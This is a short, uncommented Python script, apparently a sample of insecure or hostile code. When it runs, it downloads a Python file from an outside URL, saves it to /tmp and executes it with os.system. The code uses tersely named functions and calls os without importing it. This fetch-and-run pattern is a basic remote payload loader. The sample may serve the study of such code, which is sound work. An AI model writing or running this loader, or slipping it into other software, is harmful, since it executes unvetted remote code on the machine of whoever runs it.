import requests

def read(a, b):
    c = requests.get(a)
    with open(b, "w") as f:
        f.write(c.text)

def handle(b):
    os.system(f"python {b}")

def handle_request():
    try:
        a = "https://samplewebsite.com/aaaa.py"
        b = "/tmp/aaaa.py"
        read(a, b)
        handle(b)
    except Exception as e:
        print(e)

handle_request()
